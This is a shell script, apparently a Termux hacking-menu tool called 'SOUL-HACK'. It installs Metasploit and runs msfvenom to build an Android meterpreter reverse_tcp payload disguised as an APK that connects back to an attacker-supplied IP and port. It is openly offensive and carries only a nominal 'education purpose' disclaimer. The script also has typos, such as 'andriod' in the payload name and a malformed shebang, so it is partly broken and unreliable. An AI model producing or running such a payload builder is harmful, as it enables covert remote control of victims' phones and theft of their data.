#!bin/sh
gem install lolcat
akg install figlet
clear
figlet SOUL-HACK | lolcat
echo "WARNING: THIS SCRIPT IS ONLY FOR EDUCATION PURPOSE : USE AT YOUR OWN RISK"
echo
echo "PRESS CTRL+Z"
echo "________________________________________________________"
echo "METASPLOIT FREAMWORK WAS INSTALL OR NOT? "
echo "IF YES THEN PRESS (1) & IF NO THEN PRESS (2) "
echo
echo "           PRESS 99 FOR> MAIN MENU " |lolcat
read clk
if [ $clk -eq 1 ]; then
clear
echo "CREATING MSF PAYLOAD.............."
echo
echo "Enter you IP address"
read aa
echo "Enter LPORT ex:6666"
read ab
echo "Enter APK name"
read APK
echo "--------------------------------------------"
echo "____________________________________________"
echo "set LHOST = $aa"
echo "============================================"
echo " set LPORT = $ab "
echo "============================================"
echo "set PAYLOAD = $APK.apk "
echo "____________________________________________"
echo "--------------------------------------------"
echo
echo
echo "ENTER TO CONTINUE"
read a1
msfvenom -p andriod/meterpreter/reverse_tcp LHOST=$aa LPORT=$ab R> /sdcard/DEVIL/OUTPUT/$APK.apk
clear

exit 0
elif [ $clk -eq 2 ];then
echo "METASPLOT INSTALLING.............."
sleep 3
clear
echo
echo "(press CTRL+Z)" |lolcat
echo
pkg install metasploit
clear
echo "METASPLOIT INSTALL SUCCESSFULY" |lolcat
echo
echo "Enter you IP address"
read aa
echo "Enter LPORT ex:6666"
read ab
echo "Enter APK name"
read APK
echo "--------------------------------------------"
echo "____________________________________________"
echo "set LHOST = $aa"
echo "============================================"
echo " set LPORT = $ab "
echo "============================================"
echo "set PAYLOAD = $APK.apk "
echo "____________________________________________"
echo "--------------------------------------------"
echo
echo
echo "ENTER TO CONTINUE"
read a1
msfvenom -p andriod/meterpreter/reverse_tcp LHOST=$aa LPORT=$ab R> /sdcard/DEVIL/$APK.apk
clear
echo "Press Enter for multi handler"
read a1
echo "--------------------------------------------"
echo "____________________________________________"
echo "set LHOST = $aa"
echo "============================================"
echo " set LPORT = $ab "
echo "============================================"
echo "set PAYLOAD = $APK.apk "
echo "____________________________________________"
echo "--------------------------------------------"

exit 0
elif [ $clk -eq 99 ];then
cd
cd /sdcard/DEVIL
bash devil.sh
else
echo "[!]invalid option"
cd
cd /sdcard/DEVIL/script
bash hack.sh
fi